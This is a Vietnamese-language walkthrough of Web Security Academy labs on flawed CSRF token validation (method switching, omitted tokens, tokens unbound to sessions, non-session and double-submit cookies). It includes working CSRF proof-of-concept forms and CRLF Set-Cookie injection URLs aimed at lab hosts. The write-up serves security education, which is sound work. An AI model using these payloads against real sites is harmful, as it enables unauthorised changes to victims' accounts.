# Common flaws in CSRF token validation - Các lỗ hổng chung trong xác thực CSRF token

Các lỗ hổng CSRF thường phát sinh do xác nhận thiếu sót của các CSRF token. Trong phần này, đề cập đến một số vấn đề phổ biến nhất cho phép kẻ tấn công bypass các phòng thủ này.

# Validation of CSRF token depends on request method

Một số ứng dụng xác nhận chính xác token khi request sử dụng POST method nhưng bỏ qua xác thực khi GET method được sử dụng.

Trong tình huống này, kẻ tấn công có thể chuyển sang GET method để bypass việc xác thực và thực hiện một cuộc tấn công CSRF:

![img](https://imgur.com/zScLgug.png)

# Lab: CSRF where token validation depends on request method

![img](https://imgur.com/Kbsrw7o.png)

### Web page: 
![img](https://imgur.com/PPRTevH.png)

Thử log in vào account được cấp wiener:peter và update email, trước khi update, mở Burp Suite và Intercept request này: 

![img](https://imgur.com/8gAUJtM.png)

Send request này tới Repeater: 

![img](https://imgur.com/PSOMbhw.png)

Thử thay đổi giá trị của csrf token: 

*csrf token ban đầu*:

![img](https://imgur.com/r8Tf354.png)

*csrf token thay đổi*:

![img](https://imgur.com/lhUwjdZ.png)

Thử Send Request này: 

![img](https://imgur.com/Z7XkKun.png)

Nhận được response thông báo *Invalid CSRF token* --> Xác nhận việc thay đổi CSRK token sẽ không khả thi. 

Thử thay đổi POST method thành GET method: 

![img](https://imgur.com/kxIef12.png)

Respone nhận được: 

![img](https://imgur.com/8rzu7QH.png)

Có vẻ CSRF token đã không còn được xác minh. 

Sử dụng HTML payload sau: 

    <html>
    <!-- CSRF PoC - generated by Burp Suite Professional -->
    <body>
    <script>history.pushState('', '', '/')</script>
    <form action="https://VULNERABLE-APPLICATION.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="Test@Test.com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>document.forms[0].submit();</script>
    </body>
    </html>

(Cần thay đổi địa chỉ URL)

Go to Exploit Server: 

![img](https://imgur.com/gHhsE7s.png)

Thêm HTML payload này vào phần body:

![img](https://imgur.com/GuyWOQK.png)

Click Store và view exploit để xác nhận:

(Có thể chỉnh sửa payload để tự động cập nhật email hoặc click nút submit 1 cách thủ công)

![img](https://imgur.com/cYF1MBs.png)

![img](https://imgur.com/D3Wmepf.png)

Xác nhận đã thay đổi email, click Deliver exploit to victim.

Solved the lab!

![img](https://imgur.com/lv0149u.png)

# Validation of CSRF token depends on token being present

Một số ứng dụng xác nhận chính xác token khi nó xuất hiện nhưng bỏ qua việc xác thực nếu token bị bỏ qua.

Trong tình huống này, kẻ tấn công có thể xóa toàn bộ param chứa token (không chỉ giá trị của nó) để bypass xác thực và thực hiện một cuộc tấn công CSRF:

![img](https://imgur.com/AInWKhL.png)

# Lab: CSRF where token validation depends on token being present

![img](https://imgur.com/Na9yxnQ.png)

### Web page: 

![img](https://imgur.com/XsmlG6q.png)

Log in với account được cấp sẵn wiener:peter: 

![img](https://imgur.com/sH72QBo.png)

Mở Burp Suite và Intercept request Update email: 

![img](https://imgur.com/nOwVVKy.png)

Send Request này tới Repeater: 

![img](https://imgur.com/QMMHeUJ.png)

Thử xóa csrf param và Send Request: 

![img](https://imgur.com/UBV6ujp.png)

--> Có vẻ vẫn thay đổi được Email khi không có csrf param.

Click Go to exploit server:

![img](https://imgur.com/n7Kdj5p.png)

Thử sử dụng HTML payload: 

    <html>
    <!-- CSRF PoC - generated by Burp Suite Professional -->
    <body>
        <script>history.pushState('', '', '/')</script>
        <form method="POST" action="https://0a5e004803d3c99c8232061b0092004a.web-security-academy.net/my-account/change-email">
            <input type="hidden" name="email" value="Test@Test.com">
            <input type="submit" value="Submit request" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
    </html>

**Thay đổi URL thành URL của request change email*

![img](https://imgur.com/undefined.png)

Click Store và View exploit để xác nhận email đã được thay đổi:

![img](https://imgur.com/ZBrTEFI.png)

![img](https://imgur.com/K83QrMb.png)

Email đã được thay đổi, thay đổi lại email trong payload và Click Deliver exploit to victim:

![img](https://imgur.com/isaLDA6.png)

Solved the lab!

![img](https://imgur.com/sPYn5Mj.png)

# CSRF token is not tied to the user session - CSRF token không được gắn với user session

Một số web app không xác nhận rằng token thuộc cùng một session với user đang thực hiện request. Thay vào đó, web app duy trì một nhóm global tokens mà nó đã phát hành và chấp nhận bất kỳ token nào xuất hiện trong nhóm này.

Trong tình huống này, kẻ tấn công có thể đăng nhập vào web app bằng tài khoản của riêng họ, lấy token hợp lệ và sau đó cung cấp token đó cho người dùng nạn nhân trong cuộc tấn công CSRF của họ.

# Lab: CSRF where token is not tied to user session
![img](https://imgur.com/nX7d33B.png)

### Web page: 
![img](https://imgur.com/qn15kV0.png)

2 account được cấp là wiener:peter và carlos:montoya. Thử Login vào wiener:peter: 

![img](https://imgur.com/6Pf4mSB.png)

Thử thay đổi Email, trước khi click Update email, mở Burp Suite và Intercept Request này: 

![img](https://imgur.com/sL2Guzl.png)

Thử thay đổi 1 ký tự trong csrf token của wiener: 

![img](https://imgur.com/x1WesEr.png)

Tắt Intercept và xem kết quả: 

![img](https://imgur.com/NSAEhYt.png)

--> Invalid CSRF token. Như vậy không thể dùng token của account carlos thay thế cho token của wiener để change email. 

Thử xem lại response page /my-account?id=wiener: 

![img](https://imgur.com/v7oxJeY.png)

--> Tìm ra 1 hidden csrf token: UzTN6XEj76QvKEFgMcepmoUjaDGBceOD

Log in vào account carlos và update Email.

Trước khi click Update email, Intercept trong Burp Suite.

Thử thay csrf token này của carlos thành hidden csrf token vừa tìm được của wiener:

![img](https://imgur.com/wZUabhY.png)

Tắt Intercept và xem kết quả: 

![img](https://imgur.com/8ybakoT.png)


--> Thay đổi được email của carlos bằng hidden csrf token của wiener!

(Token ở trong ảnh thay đổi là do đã refresh lại page của wiener vì hidden csrf này có thời gian hết hạn)

    <form action="https://0a2600ef03908061b07834c000d400bd.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="attack@example.com" />
      <input type="hidden" name="csrf" value="EqKstubO77p8alLa4poDV0hf0265Fs2Q"/>
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>

![img](https://imgur.com/9ukQDaK.png)

Click Deliver exploit to victim.

Solved the lab!

![img](https://imgur.com/aVmSzqi.png)

--> Lỗ hổng trong bài này là csrf tokens không được gắn với session hiện tại.

# CSRF token is tied to a non-session cookie

Trong một biến thể về lỗ hổng trước đó, một số web app buộc CSRF tokens với cookie, nhưng không phải với cùng một cookie được sử dụng để theo dõi các session. Điều này có thể dễ dàng xảy ra khi một web app sử dụng hai framework khác nhau, một để xử lý session và một cho bảo vệ CSRF, không được tích hợp cùng nhau:

![img](https://imgur.com/ovfIqBr.png)

# CSRF token is tied to a non-session cookie - Continued

Tình huống này khó khai thác hơn nhưng vẫn dễ bị tổn thương. Nếu website chứa bất kỳ hành vi nào cho phép kẻ tấn công set cookie trong trình duyệt của nạn nhân, thì một cuộc tấn công là có thể. Kẻ tấn công có thể đăng nhập vào web app bằng tài khoản của riêng họ, lấy token hợp lệ và cookie liên quan, tận dụng hành vi thiết lập cookie để set cookie của họ vào trình duyệt của nạn nhân và cung cấp token của họ cho nạn nhân trong cuộc tấn công CSRF của họ.

**Lưu ý**

Hành vi thiết lập cookie thậm chí không cần tồn tại trong cùng một web app với lỗ hổng CSRF. Bất kỳ ứng dụng nào khác trong cùng một miền DNS tổng thể có khả năng được tận dụng để set cookie trong ứng dụng đang được nhắm mục tiêu, nếu cookie được kiểm soát có phạm vi phù hợp. Ví dụ: một function cookie-setting trên *staging.demo.normal-website.com* có ​​thể được tận dụng để set một cookie được gửi đến *secure.normal-website.com*.

# Lab: CSRF where token is tied to non-session cookie
![img](https://imgur.com/LiZoBY1.png)

### Web page: 
![img](https://imgur.com/u17aRbv.png)

Log in vào 2 account được cấp: 

![img](https://imgur.com/E2fVEte.png)


Intercept trong Burp Suite khi refresh lại page wiener: 

![img](https://imgur.com/absUkMx.png)

--> Cookie bao gồm 2 token, 1 để xử lý session và 1 có liên quan đến csrf. Có vẻ như nhận diện csrf token. 

Thử refresh lại page wiener 1 lần nữa và xem request:

![img](https://imgur.com/itgGOYS.png)

--> Cookie không thay đổi giữa 2 lần refresh.

Thử thay đổi 1 ký tự của csfrKey cookie xem có lỗi gì không: 

![img](https://imgur.com/s344JKM.png)

Tắt Intercept và page có load được không:

![img](https://imgur.com/EjfXmDe.png)

--> page bị thoát về trang Login.

Request change email và response ban đầu ở account wiener: 

![img](https://imgur.com/OxLixSv.png)

Request change email và response khi đã thay đổi csrf token 1 ký tự ở account wiener: 

![img](https://imgur.com/5RcehAU.png)

Thử thay đổi csrfKey: 

![img](https://imgur.com/jtoUupI.png)

Như vậy thì việc thay đổi csrf token và csrfKey sẽ không giải quyết được. Nhưng nếu thay đổi cả csrfKey session thì sao?

Truy cập account carlos và intercept request change email: 

![img](https://imgur.com/qj4piuy.png)

Thử thay đổi csfrKey và csrf thành csfrKey và csrf của wiener: 

csrf token wiener: Tsf3mMGOHwmECdoiG9cJTzUrm1dAzExA

csrfKey session wiener: gmNjMH9BoPTTo9eGeOLiiduODNB0iUUf

![img](https://imgur.com/OtMqJCi.png)

--> Thành công đổi email của carlos với csrfKey cookie trong session của wiener và csrf token param của wiener.

Như vậy việc cần làm là tạo ra payload html có thể inject csrfKey và csrf token param.

Để inject csrfKey, cần tạo 1 URL có dạng như sau: 
*/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None*

Thay YOUR-KEY thành csrfKey của wiener: 

*/?search=test%0d%0aSet-Cookie:%20csrfKey=gmNjMH9BoPTTo9eGeOLiiduODNB0iUUf%3b%20SameSite=None*

Và csrf token param của wiener là: Tsf3mMGOHwmECdoiG9cJTzUrm1dAzExA

Như vậy payload HTML sẽ có dạng: 

    <form action="https://0a7500ce03bd6075807fb7ca00170080.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="Test@Test.com" />
      <input type="hidden" name="csrf" value="Tsf3mMGOHwmECdoiG9cJTzUrm1dAzExA" />
      <input type="submit" value="Submit request" />
    </form>

    <img src="https://0a7500ce03bd6075807fb7ca00170080.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=gmNjMH9BoPTTo9eGeOLiiduODNB0iUUf%3b%20SameSite=None" onerror="document.forms[0].submit()">

![img](https://imgur.com/Kf4bq86.png)

CLick Deliver exploit to victim.

Solved the lab!

![img](https://imgur.com/EwOLUYs.png)

# CSRF token is simply duplicated in a cookie

Trong một biến thể tiếp theo về lỗ hổng trước đó, một số web app
không duy trì bất kỳ bản ghi nào của các tokens đã được phát hành, 
mà thay vào đó sao chép mỗi tokens trong một cookie và request param. 
Khi request tiếp theo được xác thực, web app chỉ cần xác minh rằng 
tokens được gửi trong request param khớp với giá trị được gửi trong cookie. 
Điều này đôi khi được gọi là phòng thủ "double submit" đối với CSRF 
và được ủng hộ vì nó đơn giản để thực hiện và tránh sự cần thiết cho bất kỳ 
server-side state nào:

![img](https://imgur.com/Put9JGt.png)

Trong tình huống này, kẻ tấn công lại có thể thực hiện một cuộc tấn công CSRF 
nếu trang web chứa bất kỳ function setting-cookie nào. 
Ở đây, kẻ tấn công không cần phải có được token hợp lệ của riêng họ. 
Họ chỉ đơn giản là phát minh ra một token 
(có lẽ ở định dạng cần thiết, nếu điều đó đang được kiểm tra), 
tận dụng hành vi setting cookie để set cookie của họ 
vào trình duyệt của nạn nhân và cung cấp token cho nạn nhân 
trong cuộc tấn công CSRF của họ.

# Lab: CSRF where token is duplicated in cookie
![img](https://imgur.com/ERFO6jO.png)

### Web page:

![img](https://imgur.com/fYiX0Ry.png)

Truy cập account wiener được cấp sẵn: 

![img](https://imgur.com/U4hZe9n.png)

Update email và Intercept request này trong Burp Suite: 

![img](https://imgur.com/18sCbb8.png)

--> csrf trong cookie giống với csrf param.

Thử thay cặp giá trị này thành 1 giá trị ngẫu nhiên: 

![img](https://imgur.com/DmDtHgd.png)

Cặp giá trị được thay thành "fake" và email vẫn được thay đổi!

Tiếp tục tạo payload html, để inject csrf cookie cần 1 URL như sau: 

*/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None*

Như vậy html payload sẽ như sau: 

    <form action="https://0acc00600485d43ce0bf9248005600f2.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="Test@Test.com" />
      <input type="hidden" name="csrf" value="fake" />
      <input type="submit" value="Submit request" />
    </form>

    <img src="https://0acc00600485d43ce0bf9248005600f2.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit()">

![img](https://imgur.com/olpn21w.png)

Click Deliver exploit to victim.

Solved the lab!

![img](https://imgur.com/7taJq2S.png)